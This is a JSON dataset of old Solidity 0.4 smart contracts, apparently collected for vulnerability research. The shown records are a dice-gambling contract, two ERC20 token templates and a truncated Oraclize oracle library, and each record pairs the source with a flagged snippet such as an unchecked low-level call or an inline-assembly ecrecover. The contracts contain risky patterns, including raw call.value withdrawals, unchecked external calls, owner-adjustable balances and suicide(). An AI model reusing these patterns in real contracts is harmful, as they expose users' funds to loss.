self._len);\nretptr += self._len;\n}\n}\nreturn ret;\n}\n}\ncontract DSSafeAddSub {\nfunction safeAdd(uint a, uint b) internal returns (uint) {\nrequire(a + b >= a);\nreturn a + b;\n}\nfunction safeSub(uint a, uint b) internal returns (uint) {\nrequire(b <= a);\nreturn a - b;\n}\n}\ncontract Swanroll is usingOraclize, DSSafeAddSub {\nusing strings for *;\nmodifier betIsValid(uint _betSize, uint _playerNumber) {\nif (((((_betSize * (100- (safeSub(_playerNumber, 1)))) / (safeSub(_playerNumber, 1))+ _betSize)) * houseEdge / houseEdgeDivisor) -_betSize > maxProfit || _betSize < minBet || _playerNumber < minNumber || _playerNumber > maxNumber) require(false);\n_;\n}\nmodifier gameIsActive {\nrequire(gamePaused != true);\n_;\n}\nmodifier payoutsAreActive {\nrequire(payoutsPaused != true);\n_;\n}\nmodifier onlyOraclize {\nrequire(msg.sender == oraclize_cbAddress());\n_;\n}\nmodifier onlyOwner {\nrequire(msg.sender == owner);\n_;\n}\nmodifier onlyTreasury {\nrequire(msg.sender == treasury);\n_;\n}\nuint constant public maxProfitDivisor = 1000000;\nuint constant public houseEdgeDivisor = 1000;\nuint constant public maxNumber = 99;\nuint constant public minNumber = 2;\nbool public gamePaused;\nuint32 public gasForOraclize;\naddress public owner;\nbool public payoutsPaused;\naddress public treasury;\nuint public contractBalance;\nuint public houseEdge;\nuint public maxProfit;\nuint public maxProfitAsPercentOfHouse;\nuint public minBet;\nint public totalBets = 0;\nuint public maxPendingPayouts;\nuint public totalWeiWon = 0;\nuint public totalWeiWagered = 0;\nmapping (bytes32 => address) playerAddress;\nmapping (bytes32 => address) playerTempAddress;\nmapping (bytes32 => bytes32) playerBetId;\nmapping (bytes32 => uint) playerBetValue;\nmapping (bytes32 => uint) playerTempBetValue;\nmapping (bytes32 => uint) playerDieResult;\nmapping (bytes32 => uint) playerNumber;\nmapping (address => uint) playerPendingWithdrawals;\nmapping (bytes32 => uint) playerProfit;\nmapping (bytes32 => uint) playerTempReward;\nevent LogBet(bytes32 indexed BetID, address indexed PlayerAddress, uint indexed RewardValue, uint ProfitValue, uint BetValue, uint PlayerNumber);\nevent LogResult(uint indexed ResultSerialNumber, bytes32 indexed BetID, address indexed PlayerAddress, uint PlayerNumber, uint DiceResult, uint Value, int Status, bytes Proof);\nevent LogRefund(bytes32 indexed BetID, address indexed PlayerAddress, uint indexed RefundValue);\nevent LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\nfunction Swanroll() {\nowner = msg.sender;\ntreasury = msg.sender;\noraclize_setNetwork(networkID_auto);\noraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\nownerSetHouseEdge(990);\nownerSetMaxProfitAsPercentOfHouse(100000);\nownerSetMinBet(100000000000000000);\ngasForOraclize = 250000;\n}\nfunction playerRollDice(uint rollUnder) public\npayable\ngameIsActive\nbetIsValid(msg.value, rollUnder)\n{\ncontractBalance = safeSub(contractBalance, oraclize_getPrice(\"URL\", gasForOraclize));\ntotalBets += 1;\ntotalWeiWagered += msg.value;\nbytes32 rngId = oraclize_query(\"nested\", \"[URL] ['json(https:\nplayerBetId[rngId] = rngId;\nplayerNumber[rngId] = rollUnder;\nplayerBetValue[rngId] = msg.value;\nplayerAddress[rngId] = msg.sender;\nplayerProfit[rngId] = ((((msg.value * (100 - (safeSub(rollUnder, 1)))) / (safeSub(rollUnder,1)) + msg.value)) *houseEdge / houseEdgeDivisor) - msg.value;\nmaxPendingPayouts = safeAdd(maxPendingPayouts, playerProfit[rngId]);\nrequire(maxPendingPayouts < contractBalance);\nLogBet(playerBetId[rngId], playerAddress[rngId], safeAdd(playerBetValue[rngId], playerProfit[rngId]), playerProfit[rngId], playerBetValue[rngId], playerNumber[rngId]);\n}\nfunction __callback(bytes32 myid, string result, bytes proof) public\nonlyOraclize\npayoutsAreActive\n{\nrequire(playerAddress[myid] != 0x0);\nvar sl_result = result.toSlice();\nsl_result.beyond(\"[\".toSlice()).until(\"]\".toSlice());\nuint serialNumberOfResult = parseInt(sl_result.split(', '.toSlice()).toString());\nplayerDieResult[myid] = parseInt(sl_result.beyond(\"[\".toSlice()).until(\"]\".toSlice()).toString());\nplayerTempAddress[myid] = playerAddress[myid];\ndelete playerAddress[myid];\nplayerTempReward[myid] = playerProfit[myid];\nplayerProfit[myid] = 0;\nmaxPendingPayouts = safeSub(maxPendingPayouts, playerTempReward[myid]);\nplayerTempBetValue[myid] = playerBetValue[myid];\nplayerBetValue[myid] = 0;\nif (playerDieResult[myid]== 0 || bytes(result).length == 0 || bytes(proof).length == 0){\nLogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerNumber[myid], playerDieResult[myid], playerTempBetValue[myid], 3, proof);\nif (!playerTempAddress[myid].send(playerTempBetValue[myid])){\nLogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerNumber[myid], playerDieResult[myid], playerTempBetValue[myid], 4, proof);\nplayerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], playerTempBetValue[myid]);\n}\nreturn;\n}\nif (playerDieResult[myid] < playerNumber[myid]){\ncontractBalance = safeSub(contractBalance, playerTempReward[myid]);\ntotalWeiWon = safeAdd(totalWeiWon, playerTempReward[myid]);\nplayerTempReward[myid] = safeAdd(playerTempReward[myid], playerTempBetValue[myid]);\nLogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerNumber[myid], playerDieResult[myid], playerTempReward[myid], 1, proof);\nsetMaxProfit();\nif (!playerTempAddress[myid].send(playerTempReward[myid])){\nLogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerNumber[myid], playerDieResult[myid], playerTempReward[myid], 2, proof);\nplayerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], playerTempReward[myid]);\n}\nreturn;\n}\nif (playerDieResult[myid] >= playerNumber[myid]){\nLogResult(serialNumberOfResult, playerBetId[myid], playerTempAddress[myid], playerNumber[myid], playerDieResult[myid], playerTempBetValue[myid], 0, proof);\ncontractBalance = safeAdd(contractBalance, (playerTempBetValue[myid] - 1));\nsetMaxProfit();\nif (!playerTempAddress[myid].send(1)){\nplayerPendingWithdrawals[playerTempAddress[myid]] = safeAdd(playerPendingWithdrawals[playerTempAddress[myid]], 1);\n}\nreturn;\n}\n}\nfunction playerWithdrawPendingTransactions() public\npayoutsAreActive\nreturns (bool)\n{\nuint withdrawAmount = playerPendingWithdrawals[msg.sender];\nplayerPendingWithdrawals[msg.sender] = 0;\nif (msg.sender.call.value(withdrawAmount)()) {\nreturn true;\n} else {\nplayerPendingWithdrawals[msg.sender] = withdrawAmount;\nreturn false;\n}\n}\nfunction playerGetPendingTxByAddress(address addressToCheck) public constant returns (uint) {\nreturn playerPendingWithdrawals[addressToCheck];\n}\nfunction setMaxProfit() internal {\nmaxProfit = (contractBalance * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n}\nfunction ()\npayable\nonlyTreasury\n{\ncontractBalance = safeAdd(contractBalance, msg.value);\nsetMaxProfit();\n}\nfunction ownerSetOraclizeSafeGas(uint32 newSafeGasToOraclize) public\nonlyOwner\n{\ngasForOraclize = newSafeGasToOraclize;\n}\nfunction ownerUpdateContractBalance(uint newContractBalanceInWei) public\nonlyOwner\n{\ncontractBalance = newContractBalanceInWei;\n}\nfunction ownerSetHouseEdge(uint newHouseEdge) public\nonlyOwner\n{\nhouseEdge = newHouseEdge;\n}\nfunction ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\nonlyOwner\n{\nrequire(newMaxProfitAsPercent <= 100000);\nmaxProfitAsPercentOfHouse = newMaxProfitAsPercent;\nsetMaxProfit();\n}\nfunction ownerSetMinBet(uint newMinimumBet) public\nonlyOwner\n{\nminBet = newMinimumBet;\n}\nfunction ownerTransferEther(address sendTo, uint amount) public\nonlyOwner\n{\ncontractBalance = safeSub(contractBalance, amount);\nsetMaxProfit();\nrequire(sendTo.send(amount));\nLogOwnerTransfer(sendTo, amount);\n}\nfunction ownerRefundPlayer(bytes32 originalPlayerBetId, address sendTo, uint originalPlayerProfit, uint originalPlayerBetValue) public\nonlyOwner\n{\nmaxPendingPayouts = safeSub(maxPendingPayouts, originalPlayerProfit);\nrequire(sendTo.send(originalPlayerBetValue));\nLogRefund(originalPlayerBetId, sendTo, originalPlayerBetValue);\n}\nfunction ownerPauseGame(bool newStatus) public\nonlyOwner\n{\ngamePaused = newStatus;\n}\nfunction ownerPausePayouts(bool newPayoutStatus) public\nonlyOwner\n{\npayoutsPaused = newPayoutStatus;\n}\nfunction ownerSetTreasury(address newTreasury) public\nonlyOwner\n{\ntreasury = newTreasury;\n}\nfunction ownerChangeOwner(address newOwner) public\nonlyOwner\n{\nowner = newOwner;\n}\nfunction ownerkill() public\nonlyOwner\n{\nsuicide(owner);\n}\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb161d"
  },
  "filename": "38464.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 5000000000000;\n totalSupply = 5000000000000;\n name = \"SCAM Token\";\n decimals = 4;\n symbol = \"SCAM\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb161e"
  },
  "filename": "38497.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Kitcoins is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Kitcoins(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"Kitcoins\";\n decimals = 0;\n symbol = \"KIT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb161f"
  },
  "filename": "38528.sol",
  "content": "pragma solidity ^0.4.11;\npragma solidity ^0.4.0;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) payable returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n function setConfig(bytes32 _config);\n function setCustomGasPrice(uint _gasPrice);\n function randomDS_getSessionPubKeyHash() returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0)) oraclize_setNetwork(networkID_auto);\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n }\n function oraclize_useCoupon(string code) oraclizeAPI internal {\n oraclize.useCoupon(code);\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory 